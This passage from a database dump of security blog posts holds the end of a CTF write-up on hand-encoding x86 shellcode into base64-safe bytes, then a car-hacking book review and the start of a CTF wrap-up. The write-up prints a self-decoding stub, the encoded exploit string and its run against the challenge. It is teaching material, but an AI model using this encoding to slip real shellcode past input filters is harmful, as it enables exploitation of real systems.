eax\r\npopad\r\n\r\n; Set edx to 0x00000080, just like before\r\npush 0x41414146\r\npop eax\r\nxor eax, 0x41414139 ; eax -> 0x7F\r\npush eax\r\npop edx ; edx -> 0x7F\r\ninc edx ; edx -> 0x80\r\n\r\n; Push edi (which, like all registers, is 0) onto the stack\r\npush edi ; 0x00000000\r\n\r\n; Push edx onto the stack\r\npush edx\r\n\r\n; Move esp by 1 byte - note that this won\'t work on many architectures, but x86/x64 are fine with a misaligned stack\r\ndec esp\r\n\r\n; Get edx back, shifted by one byte\r\npop edx\r\n\r\n; Fix the stack (not <em>really</em> necessary, but it\'s nice to do it\r\ninc esp\r\n\r\n; Add a debug breakpoint so we can inspect the value\r\nint 3\r\n\nAnd we can use gdb to prove it works with the same trick as before:\n\r\n$ nasm -o file file.asm\r\n$ rm -f core\r\n$ ulimit -c unlimited\r\n$ ./run_raw_code ./file\r\nallocated 41 bytes of executable memory at: 0x41410000\r\nfish: “~/projects/ctf-2017-release/for...” terminated by signal SIGTRAP (Trace or breakpoint trap)\r\n$ gdb ./run_raw_code ./core\r\nProgram terminated with signal SIGTRAP, Trace/breakpoint trap.\r\n#0  0x41410029 in ?? ()\r\n(gdb) print/x $edx\r\n$1 = 0x8000\r\n\nWe can do basically the exact same thing to set the third byte:\n\r\npush edi ; 0x00000000\r\npush edx\r\ndec esp\r\ndec esp ; <-- New\r\npop edx\r\ninc esp\r\ninc esp ; <-- New\r\n\nAnd the fourth:\n\r\npush edi ; 0x00000000\r\npush edx\r\ndec esp\r\ndec esp\r\ndec esp ; <-- New\r\npop edx\r\ninc esp\r\ninc esp\r\ninc esp ; <-- New\r\n\nPutting it all together\nYou can take a look at how I do this in my final code. It\'s going to be a little different, because instead of using our xor trick to set edx to 0x7F, I instead push 0x7a / pop edx / increment 6 times. The only reason is that I didn\'t think of the xor trick when I was writing the original code, and I don\'t want to mess with it now.\nBut, we\'re going to do it the hard way: by hand! I\'m literally writing this code as I write the blog (and, message from the future: it worked on the second try :) ).\nLet\'s just stick with our simple exit-with-0x41414141-status shellcode:\n\r\nmov eax, 0x01 ; Syscall 1 = sys_exit\r\nmov ebx, 0x41414141 ; First (and only) parameter: the exit code\r\nint 0x80\r\n\nWhich assembles to this, which is conveniently already a multiple of 4 bytes so no padding required:\n\r\n00000000  b8 01 00 00 00 bb 41 41  41 41 cd 80              |......AAAA..|\r\n\nSince we\'re doing it by hand, let\'s extract all the MSBs into a separate string (remember, this is all done programmatically usually):\n\r\n00000000  38 01 00 00 00 3b 41 41  41 41 4d 00              |......AAAA..|\r\n00000000  80 00 00 00 00 80 00 00  00 00 80 80              |......AAAA..|\r\n\nIf you xor those two strings together, you\'ll get the original string back.\nFirst, let\'s worry about the first string. It\'s handled exactly the way we did the last example. We start by getting the three 32-bit values as little endian values:\n\n38 01 00 00 -> 0x00000138\n00 3b 41 41 -> 0x41413b00\n41 41 4d 00 -> 0x004d4141\n\nAnd then find the xor pairs to generate them just like before:\n\r\nirb(main):061:0> puts \'0x%08x ^ 0x%08x\' % get_xor_values_32(0x00000138)\r\n0x41414241 ^ 0x41414379\r\n\r\nirb(main):062:0> puts \'0x%08x ^ 0x%08x\' % get_xor_values_32(0x41413b00)\r\n0x6a6a4141 ^ 0x2b2b7a41\r\n\r\nirb(main):063:0> puts \'0x%08x ^ 0x%08x\' % get_xor_values_32(0x004d4141)\r\n0x41626a6a ^ 0x412f2b2b\r\n\nBut here\'s where the twist comes: let\'s take the MSB string above, and also convert that to little-endian integers:\n\n80 00 00 00 -> 0x00000080\n00 80 00 00 -> 0x00008000\n00 00 80 80 -> 0x80800000\n\nNow, let\'s try writing our decoder stub just like before, except that after decoding the MSB-free vale, we\'re going to separately inject the MSBs into the code!\n\r\n; Set all registers to 0 so we start with a clean slate, using the popad strategy from earlier\r\npush 0x41414141\r\npop eax\r\nxor eax, 0x41414141\r\npush eax\r\npush eax\r\npush eax\r\npush eax\r\npush eax\r\npush eax\r\npush eax\r\npush eax\r\npopad\r\n\r\n; Set ecx to 0x41410100 (0x41 bytes less than the start of the encoded data)\r\npush 0x6a6a4241\r\npop eax\r\nxor eax, 0x2b2b4341 ; 0x41410100\r\npush eax\r\npop ecx\r\n\r\n; xor the first pair\r\npush 0x41414241\r\npop edx\r\nxor [ecx+0x41], edx\r\n\r\n; Now we need to xor with 0x00000080, so let\'s load it into edx\r\npush 0x41414146\r\npop eax\r\nxor eax, 0x41414139 ; 0x0000007F\r\npush eax\r\npop edx\r\ninc edx ; edx is now 0x00000080\r\nxor [ecx+0x41], edx\r\n\r\n; Move to the next value\r\ninc ecx\r\ninc ecx\r\ninc ecx\r\ninc ecx\r\n\r\n; xor the second pair\r\npush 0x6a6a4141\r\npop edx\r\nxor [ecx+0x41], edx\r\n\r\n; Now we need to xor with 0x00008000\r\npush 0x41414146\r\npop eax\r\nxor eax, 0x41414139 ; 0x0000007F\r\npush eax\r\npop edx\r\ninc edx ; edx is now 0x00000080\r\n\r\npush edi ; 0x00000000\r\npush edx\r\ndec esp\r\npop edx ; edx is now 0x00008000\r\ninc esp\r\nxor [ecx+0x41], edx\r\n\r\n; Move to the next value\r\ninc ecx\r\ninc ecx\r\ninc ecx\r\ninc ecx\r\n\r\n; xor the third pair\r\npush 0x41626a6a\r\npop edx\r\nxor [ecx+0x41], edx\r\n\r\n; Now we need to xor with 0x80800000; we\'ll do it in two operations, with 0x00800000 first\r\npush 0x41414146\r\npop eax\r\nxor eax, 0x41414139 ; 0x0000007F\r\npush eax\r\npop edx\r\ninc edx ; edx is now 0x00000080\r\npush edi ; 0x00000000\r\npush edx\r\ndec esp\r\ndec esp\r\npop edx ; edx is now 0x00800000\r\ninc esp\r\ninc esp\r\nxor [ecx+0x41], edx\r\n\r\n; And then the 0x80000000\r\npush 0x41414146\r\npop eax\r\nxor eax, 0x41414139 ; 0x0000007F\r\npush eax\r\npop edx\r\ninc edx ; edx is now 0x00000080\r\npush edi ; 0x00000000\r\npush edx\r\ndec esp\r\ndec esp\r\ndec esp\r\npop edx ; edx is now 0x00800000\r\ninc esp\r\ninc esp\r\ninc esp\r\nxor [ecx+0x41], edx\r\n\r\n; Padding (calculated based on the length above, subtracted from 0x141)\r\ndb \'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\'\r\ndb \'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\'\r\ndb \'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\'\r\ndb \'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\'\r\ndb \'AAAAAAAAAAAAAAAAAAAA\'\r\n\r\n; The second halves of the pairs (ie, the encoded data; this is where the decoded data will end up by the time execution gets here)\r\ndd 0x41414379\r\ndd 0x2b2b7a41\r\ndd 0x412f2b2b\r\n\nAnd that\'s it! Let\'s try it out! The code leading up to the padding assembles to:\n\r\n00000000  68 41 41 41 41 58 35 41  41 41 41 50 50 50 50 50  |hAAAAX5AAAAPPPPP|\r\n00000010  50 50 50 61 68 41 42 6a  6a 58 35 41 43 2b 2b 50  |PPPahABjjX5AC++P|\r\n00000020  59 68 41 42 41 41 5a 31  51 41 68 46 41 41 41 58  |YhABAAZ1QAhFAAAX|\r\n00000030  35 39 41 41 41 50 5a 42  31 51 41 41 41 41 41 68  |59AAAPZB1QAAAAAh|\r\n00000040  41 41 6a 6a 5a 31 51 41  68 46 41 41 41 58 35 39  |AAjjZ1QAhFAAAX59|\r\n00000050  41 41 41 50 5a 42 57 52  4c 5a 44 31 51 41 41 41  |AAAPZBWRLZD1QAAA|\r\n00000060  41 41 68 6a 6a 62 41 5a  31 51 41 68 46 41 41 41  |AAhjjbAZ1QAhFAAA|\r\n00000070  58 35 39 41 41 41 50 5a  42 57 52 4c 4c 5a 44 44  |X59AAAPZBWRLLZDD|\r\n00000080  31 51 41 68 46 41 41 41  58 35 39 41 41 41 50 5a  |1QAhFAAAX59AAAPZ|\r\n00000090  42 57 52 4c 4c 4c 5a 44  44 44 31 51 41           |BWRLLLZDDD1QA|\r\n\nWe can verify it\'s all base64 by eyeballing it. We can also determine that it\'s 0x9d bytes long, which means to get to 0x141 we need to pad it with 0xa4 bytes (already included above) before the encoded data.\nWe can dump allll that code into a file, and run it with run_raw_code (don\'t forget to apply the patch from earlier to change the base address to 0x41410000, and don\'t forget to compile with -m32 for 32-bit mode):\n\r\n$ nasm -o file file.asm\r\n$ strace ./run_raw_code ./file\r\nread(3, \"hAAAAX5AAAAPPPPPPPPahABjjX5AC++P\"..., 333) = 333\r\nexit(1094795585)                        = ?\r\n+++ exited with 65 +++\r\n\nIt works! And it only took me two tries (I missed the \'inc ecx\' lines the first time :) ).\nI realize that it\'s a bit inefficient to encode 3 lines into like 100, but that\'s the cost of having a limited character set!\nSolving the level\nBringing it back to the actual challenge...\nNow that we have working base 64 code, the rest is pretty simple. Since the app encodes the base64 for us, we have to take what we have and decode it first, to get the string that would generate the base64 we want.\nBecause base64 works in blocks and has padding, we\'re going to append a few meaningless bytes to the end so that if anything gets messed up by being a partial block, they will.\nHere\'s the full \"exploit\", assembled:\nhAAAAX5AAAAPPPPPPPPahABjjX5AC++PYhABAAZ1QAhFAAAX59AAAPZB1QAAAAAhAAjjZ1QAhFAAAX59AAAPZBWRLZD1QAAAAAhjjbAZ1QAhFAAAX59AAAPZBWRLLZDD1QAhFAAAX59AAAPZBWRLLLZDDD1QAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAyCAAAz++++/A\nWe\'re going to add a few \'A\'s to the end for padding (the character we choose is meaningless), and run it through base64 -d (adding \'=\'s to the end until we stop getting decoding errors):\n\r\n$ echo \'hAAAAX5AAAAPPPPPPPPahABjjX5AC++PYhABAAZ1QAhFAAAX59AAAPZB1QAAAAAhAAjjZ1QAhFAAAX59AAAPZBWRLZD1QAAAAAhjjbAZ1QAhFAAAX59AAAPZBWRLLZDD1QAhFAAAX59AAAPZBWRLLLZDDD1QAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAyCAAAz++++/AAAAAAA=\' | base64 -d | hexdump -Cv\r\n00000000  84 00 00 01 7e 40 00 00  0f 3c f3 cf 3c f3 da 84  |....~@...<..<...|\r\n00000010  00 63 8d 7e 40 0b ef 8f  62 10 01 00 06 75 40 08  |.c.~@...b....u@.|\r\n00000020  45 00 00 17 e7 d0 00 00  f6 41 d5 00 00 00 00 21  |E........A.....!|\r\n00000030  00 08 e3 67 54 00 84 50  00 01 7e 7d 00 00 0f 64  |...gT..P..~}...d|\r\n00000040  15 91 2d 90 f5 40 00 00  00 08 63 8d b0 19 d5 00  |..-..@....c.....|\r\n00000050  21 14 00 00 5f 9f 40 00  03 d9 05 64 4b 2d 90 c3  |!..._.@....dK-..|\r\n00000060  d5 00 21 14 00 00 5f 9f  40 00 03 d9 05 64 4b 2c  |..!..._.@....dK,|\r\n00000070  b6 43 0c 3d 50 00 00 00  00 00 00 00 00 00 00 00  |.C.=P...........|\r\n00000080  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|\r\n00000090  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|\r\n000000a0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|\r\n000000b0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|\r\n000000c0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|\r\n000000d0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|\r\n000000e0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|\r\n000000f0  03 20 80 00 0c fe fb ef  bf 00 00 00 00 00        |. ............|\r\n\nLet\'s convert that into a string that we can use on the commandline by chaining together a bunch of shell commands:\n\r\necho -ne \'hAAAAX5AAAAPPPPPPPPahABjjX5AC++PYhABAAZ1QAhFAAAX59AAAPZB1QAAAAAhAAjjZ1QAhFAAAX59AAAPZBWRLZD1QAAAAAhjjbAZ1QAhFAAAX59AAAPZBWRLLZDD1QAhFAAAX59AAAPZBWRLLLZDDD1QAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAyCAAAz++++/AAAAAAA=\' | base64 -d | xxd -g1 file | cut -b10-57 | tr -d \'\\n\' | sed \'s/ /\\\\x/g\'\r\n\\x84\\x00\\x00\\x01\\x7e\\x40\\x00\\x00\\x0f\\x3c\\xf3\\xcf\\x3c\\xf3\\xda\\x84\\x00\\x63\\x8d\\x7e\\x40\\x0b\\xef\\x8f\\x62\\x10\\x01\\x00\\x06\\x75\\x40\\x08\\x45\\x00\\x00\\x17\\xe7\\xd0\\x00\\x00\\xf6\\x41\\xd5\\x00\\x00\\x00\\x00\\x21\\x00\\x08\\xe3\\x67\\x54\\x00\\x84\\x50\\x00\\x01\\x7e\\x7d\\x00\\x00\\x0f\\x64\\x15\\x91\\x2d\\x90\\xf5\\x40\\x00\\x00\\x00\\x08\\x63\\x8d\\xb0\\x19\\xd5\\x00\\x21\\x14\\x00\\x00\\x5f\\x9f\\x40\\x00\\x03\\xd9\\x05\\x64\\x4b\\x2d\\x90\\xc3\\xd5\\x00\\x21\\x14\\x00\\x00\\x5f\\x9f\\x40\\x00\\x03\\xd9\\x05\\x64\\x4b\\x2c\\xb6\\x43\\x0c\\x3d\\x50\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x03\\x20\\x80\\x00\\x0c\\xfe\\xfb\\xef\\xbf\\x00\\x00\\x00\\x00\\x00\r\n\nAnd, finally, feed all that into b-64-b-tuff:\n\r\n$ echo -ne \'\\x84\\x00\\x00\\x01\\x7e\\x40\\x00\\x00\\x0f\\x3c\\xf3\\xcf\\x3c\\xf3\\xda\\x84\\x00\\x63\\x8d\\x7e\\x40\\x0b\\xef\\x8f\\x62\\x10\\x01\\x00\\x06\\x75\\x40\\x08\\x45\\x00\\x00\\x17\\xe7\\xd0\\x00\\x00\\xf6\\x41\\xd5\\x00\\x00\\x00\\x00\\x21\\x00\\x08\\xe3\\x67\\x54\\x00\\x84\\x50\\x00\\x01\\x7e\\x7d\\x00\\x00\\x0f\\x64\\x15\\x91\\x2d\\x90\\xf5\\x40\\x00\\x00\\x00\\x08\\x63\\x8d\\xb0\\x19\\xd5\\x00\\x21\\x14\\x00\\x00\\x5f\\x9f\\x40\\x00\\x03\\xd9\\x05\\x64\\x4b\\x2d\\x90\\xc3\\xd5\\x00\\x21\\x14\\x00\\x00\\x5f\\x9f\\x40\\x00\\x03\\xd9\\x05\\x64\\x4b\\x2c\\xb6\\x43\\x0c\\x3d\\x50\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x03\\x20\\x80\\x00\\x0c\\xfe\\xfb\\xef\\xbf\\x00\\x00\\x00\\x00\\x00\' | strace ./b-64-b-tuff\r\nread(0, \"\\204\\0\\0\\1~@\\0\\0\\17<\\363\\317<\\363\\332\\204\\0c\\215~@\\v\\357\\217b\\20\\1\\0\\6u@\\10\"..., 4096) = 254\r\nwrite(1, \"Read 254 bytes!\\n\", 16Read 254 bytes!\r\n)       = 16\r\nwrite(1, \"hAAAAX5AAAAPPPPPPPPahABjjX5AC++P\"..., 340hAAAAX5AAAAPPPPPPPPahABjjX5AC++PYhABAAZ1QAhFAAAX59AAAPZB1QAAAAAhAAjjZ1QAhFAAAX59AAAPZBWRLZD1QAAAAAhjjbAZ1QAhFAAAX59AAAPZBWRLLZDD1QAhFAAAX59AAAPZBWRLLLZDDD1QAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAyCAAAz++++/AAAAAAA=) = 340\r\nwrite(1, \"\\n\", 1\r\n)                       = 1\r\nexit(1094795585)                        = ?\r\n+++ exited with 65 +++\r\n\nAnd, sure enough, it exited with the status that we wanted! Now that we\'ve encoded 12 bytes of shellcode, we can encode any amount of arbitrary code that we choose to!\nSummary\nSo that, ladies and gentlemen and everyone else, is how to encode some simple shellcode into base64 by hand. My solution does almost exactly those steps, but in an automated fashion. I also found a few shortcuts while writing the blog that aren\'t included in that code.\nTo summarize:\n\nPad the input to a multiple of 4 bytes\nBreak the input up into 4-byte blocks, and find an xor pair that generates each value\nSet ecx to a value that\'s 0x41 bits before the encoded payload, which is half of the xor pairs\nPut the other half the xor pair in-line, loaded into edx and xor\'d with the encoded payload\nIf there are any MSB bits set, set edx to 0x80 and use the stack to shift them into the right place to be inserted with a xor\nAfter all the xors, add padding that\'s base64-compatible, but is effectively a no-op, to bridge between the decoder and the encoded payload\nEnd with the encoded stub (second half of the xor pairs)\n\nWhen the code runs, it xors each pair, and writes it in-line to where the encoded value was. It sets the MSB bits as needed. The padding runs, which is an effective no-op, then finally the freshly decoded code runs.\nIt\'s complex, but hopefully this blog helps explain it!', '\'CTFs\', \'Hacking\'', 'https://blog.skullsecurity.org/2017/solving-b-64-b-tuff-writing-base64-and-alphanumeric-shellcode');
INSERT INTO `skullsecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (2, 'Book review: The Car Hacker’s Handbook', 'Ron Bowes', '2017-6-12', 'So, this is going to be a bit of an unusual blog for me. I usually focus on technical stuff, exploitation, hacking, etc. But this post will be a mixture of a book review, some discussion on my security review process, and whatever asides fall out of my keyboard when I hit it for long enough. But, don\'t fear! I have a nice heavy technical blog ready to go for tomorrow!\n\nIntroduction\nLet\'s kick this off with some pointless backstory! Skip to the next <h1> heading if you don\'t care how this blog post came about. :)\nSo, a couple years ago, I thought I\'d give Audible a try, and read (err, listen to) some Audiobooks. I was driving from LA to San Francisco, and picked up a fiction book (one of Terry Pratchett\'s books in the Tiffany Aching series). I hated it (the audio experience), but left Audible installed and my account active.\nA few months ago, on a whim, I figured I\'d try a non-fiction book. I picked up NOFX\'s book, \"The Hepatitis Bathtub and Other Stories\". It was read by the band members and it was super enjoyable to listen while walking and exercising! And, it turns out, Audible had been giving me credits for some reason, and I have like 15 free books or something that I\'ve been consuming like crazy.\nSince my real-life friends are sick of listening to me talk about all books I\'m reading, I started amusing myself by posting mini-reviews on Facebook, which got some good feedback.\nThat got me thinking: writing book reviews is kinda fun!\nThen a few days ago, I was talking to a publisher friend at Rocky Mountain books , and he mentioned how he there\'s a reviewer who they sent a bunch of books to, and who didn\'t write any reviews. My natural thought was, \"wow, what a jerk!\".\nThen I remembered: I\'d promised No Starch that I\'d write about The Car Hacker\'s Handbook like two years ago, and totally forgot. Am I the evil scientist jerk?\nSo now, after re-reading the book, you get to hear my opinions. :)\nThreat Models\nI\'ve never really written about a technical book before, at least, not to a technical audience. So bear with this stream-of-consciousness style. :)\nI think my favourite part of the book is the layout. When writing a book about car hacking to a technical audience, there\'s always a temptation to start with the \"cool stuff\" - protocols, exploits, stuff like that. It\'s also easy to forget about the varied level of your audience, and to assume knowledge. Since I have absolutely zero knowledge about car hacking (or cars, for that matter; my proudest accomplishment is filling the washer fluid by the third try and pulling up to the correct side of the gas pumps), I was a little worried.\nAt my current job (and previous one), I do product security reviews. I go through the cycle of: \"here\'s something you\'ve never seen before: ramp up, become an expert, and give us good advice. You have one week\". If you ever have to do this, here\'s my best advice: just ask the engineers where they think the security problems are. In 5 minutes of casual conversation, you can find all the problems in a system and look like a hero. I love engineers. :)\nBut what happens when the engineers don\'t have security experience, or take an adversarial approach? Or when you want a more thorough / complete review?\nThat\'s how I learned to make threat models! Threat models are simply a way to discover the \"attack surface\", which is where you need to focus your attention as a reviewer (or developer). If you Google the term, you\'ll find lots of technical information on the \"right way\" to make a threat model. You might hear about STRIDE (spoofing/tampering/repudiation/information disclosure/denial of service/escalation of privileges). When I tried to use that, I tended to always get stuck on the same question: \"what the heck IS \'repudiation\', anyways?\".\nBut yeah, that doesn\'t really matter. I use STRIDE to help me come up with questions and scenarios, but I don\'t do anything more formal than that.\nIf you are approaching a new system, and you want a threat model, here\'s what you do: figure out (or ask) what the pieces are, and how they fit together. The pieces could be servers, processes, data levels, anything like that; basically, things with a different \"trust level\", or things that shouldn\'t have full unfettered access to each other (read, or write, or both).\nOnce you have all that figured out, look at each piece and each connection between pairs of pieces and try to think of what can go wrong. Is plaintext data passing through an insecure medium? Is the user authentication/authorization happening in the right place? Is the traffic all repudiatable (once we figure out what that means)? Can data be forged? Or changed?\nIt doesn\'t have to be hard. It doesn\'t have to match any particular standard. Just figure out what the pieces are and where things can go wrong. If you start there, the rest of a security review is much, much easier for both you and the engineers you\'re working with. And speaking of the engineers: it\'s almost always worth the time to work together with engineers to develop a threat model, because they\'ll remember it next time.\nAnyway, getting back to the point: that\'s the exact starting point that the Car Hacker\'s Handbook takes! The very first chapter is called \"Understanding Threat Models\". It opens by taking a \"bird\'s eye view\" of a car\'s systems, and talking about the big pieces: the cellular receiver, the Bluetooth, the wifi, the \"infotainment\" console, and so on. All these pieces that I was vaguely aware of in my car, but didn\'t really know the specifics of.\nIt then breaks them down into the protocols they use, what the range is, and how they\'re parsed. For example, the Bluetooth is \"near range\", and is often handled by \"Bluez\". USB is, obviously, a cable connection, and is typically handled by udev in the kernel. And so on.\nThen they look at the potential threats: remotely taking over a vehicle, unlocking it, stealing it, tracking it, and so on.\nFor every protocol, it looks at every potential threat and how it might be affected.\nThis is the perfect place to start! The authors made the right choice, no doubt about it!\n(Sidenote: because the rule of comedy is that 3 references to something is funnier than 2, and I couldn\'t find a logical third place to mention it, I just want to say \"repudiation\" again.)\nProtocols\nIf you read my blog regularly, you know that I love protocols. The reason I got into information security in the first place was by reverse engineering Starcraft\'s game protocol and implementing and documenting it (others had reversed it before, but nobody had published the information).\nSo I found the section on protocols intriguing! It\'s not like the olden days, when every protocol was custom and proprietary and weird: most of the protocols are well documented, and it just requires the right hardware to interface with it.\nI don\'t want to dwell on this too much, but the book spends a TON of time talking about how to find physical ports, sniff protocols, understand what you\'re seeing, and figure out how to do things like unlock your doors in a logical, step-by-step manner. These protocols are all new to me, but I loved the logical approach that they took throughout the protocol chapters. For somebody like me, having no experience with car hacking or even embedded systems, it was super easy to follow and super informative!\nIt\'s good enough that I wanted to buy a new car just so I could hack it. Unfortunately, my accountant didn\'t think I\'d be able to write it off as a business expense. :(\nAttacks\nAfter going over the protocols, the book moves to attacks. I had just taken a really good class on hardware exploitation, and many of the same principles applied: dumping firmware, reverse engineering it, and exploring the attack surfaces.\nNot being a hardware guy, I don\'t really want to attempt to reproduce this part in any great detail. It goes into a ton of detail on building out a lab, exploring attack surfaces (like the \"infotainment\" system, vehicle-to-vehicle communication, and even using SDR (software defined radio) to eavesdrop and inject into the wireless communication streams).\nConclusion\nSo yeah, this book is definitely well worth the read!\nThe progression is logical, and it\'s an incredible introduction, even for somebody with absolutely no knowledge of cars or embedded systems!\nAlso: I\'d love to hear feedback on this post! I\'m always looking for new things to write about, and if people legitimately enjoy hearing about the books I read, I\'ll definitely do more of this!', '\'Reviews\'', 'https://blog.skullsecurity.org/2017/book-review-the-car-hackers-handbook');
INSERT INTO `skullsecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (3, 'BSidesSF CTF wrap-up', 'Ron Bowes', '2017-2-22', 'Welcome!\nWhile this is technically a CTF writeup, like I frequently do, this one is going to be a bit backwards: this is for a CTF I ran, instead of one I played! I\'ve gotta say, it\'s been a little while since I played in a CTF, but I had a really good time running the BSidesSF CTF! I just wanted to thank the other organizers - in alphabetical order - @bmenrigh, @cornflakesavage, @itsc0rg1, and @matir. I couldn\'t have done it without you folks!\nBSidesSF CTF was a capture-the-flag challenge that ran in parallel with BSides San Francisco. It was designed to be easy/intermediate level, but we definitely had a few hair-pulling challenges.\nThe goal of this post is to explain a little bit of the motivation behind the challenges I wrote, and to give basic solutions. It\'s not going to have a step-by-step walkthrough of each challenge - though you might find that in the writeups list - but, rather, I\'ll cover what I intended to teach, and some interesting (to me :) ) trivia.\nIf you want to see the source of the challenges, our notes, and mostly everything else we generated as part of creating this CTF, you can find them here:\n\nOriginal sourcecode on github\nGoogle Drive notes (note that that\'s not the complete set of notes - some stuff (like comments from our meetings, brainstorming docs, etc) are a little too private, and contain ideas for future challenges :) )\n\nPart of my goal for releasing all of our source + planning documents + deployment files is to a) show others how a CTF can be run, and b) encourage other CTF developers to follow suit and release their stuff!\nAs of the writing, the scoreboard and challenges are still online. We plan to keep them around for a couple more days before finally shutting them down.\nInfrastructure\nThe rest of my team can most definitely confirm this: I\'m not an infrastructure kinda guy. I was happy to write challenges, and relied on others for infrastructure bits. The only thing I did was write a Dockerfile for each of my challenges.\nAs such, I\'ll defer to my team on this part. I\'m hoping that others on my team will post more details about the configurations, which I\'ll share on my Twitter feed. You can also find all the Dockerfiles and deployment scripts on our Github repository.\nWhat I do know is, we used:\n\nGoogles CTF Scoreboard running on AppEngine for our scoreboard\nDockerfiles for each challenge that had an online component, and Docker for testing\ndocker-compose for testing\nKubernetes for deployment\nGoogle Container Engine for running all of that in The Cloud\n\nAs I said, all the configurations are on Github. The infrastructure worked great, though, we had absolutely no traffic or load problems, and only very minor other problems.\nI\'m also super excited that Google graciously sponsored all of our Google Cloud expenses! The CTF weekend cost us roughly $500 - $600, and as of now we\'ve spent a little over $800.\nPlayers\nJust a few numbers:\n\nWe had 728 teams register\nWe had 531 teams score at least one point\nWe had 354 teams score at least 100 points\nWe had 23 teams submit at least one on-site flag (presumably, that many teams played on-site)\n\nAlso, the top-10 teams were:\n\ndcua :: 6773\nOpenToAll :: 5178\nscryptos :: 5093\nDragon Sector :: 4877\nAntichat :: 4877\np4 :: 4777\nkhack40 :: 4677\nsquareroots :: 4643\nASIS :: 4427\nOx002147 :: 4397\n\nThe top-10 teams on-site were:\n\nOpenToAll :: 5178\n▣ :: 3548\nhash_slinging_hackers :: 3278\nNeverTry :: 2912\n0x41434142 :: 2668\nDevOps Solution :: 1823\nShadow Cats :: 1532\nHOW BOU DAH :: 1448\nNewbie :: 762\nCTYS :: 694\n\nThe full list can be found on our CTFTime.org page.\nOn-site challenges\nWe had three on-site challenges (none of them created by me):\non-sight [1]\nThis was a one-point challenge designed simply to determine who\'s eligible for on-site prizes. We had to flag taped to the wall. Not super interesting. :)\n(Speaking of prizes, I want to give a shout out to Synack for providing some prizes, and in particular to working with us on a fairly complex set-up for dealing with said prizes. :)\nShared Secrets [250]\nThe Shared Secrets challenge was a last-minute idea. We wanted more on-site challenges, and others on the CTF organizers team came up with Shamir Shared Secret Scheme. We posted QR Codes containing pieces of a secret around the venue.\nIt was a \"3 of 6\" scheme, so only three were actually needed to get the secret.\nThe quotes on top of each image try to push people towards either \"Shamir\" or \"ACM 22(11)\". My favourite was, \"Hi, hi, howdy, howdy, hi, hi! While everyone is minus, you could call me multiply\", which is a line from a Shamir (the rapper) song. I did not determine if Shamir the rapper and Shamir the cryptographer were the same person. :)\nLocker [150]\nLocker is really cool! We basically set up a padlock with an Arduino and a receipt printer. After successfully picking the lock, you\'d get a one-time-use flag printed out by the printer.\n(We had some problems with submitting the flag early-on, because we forgot to build the database for the one-time-use flags, but got that 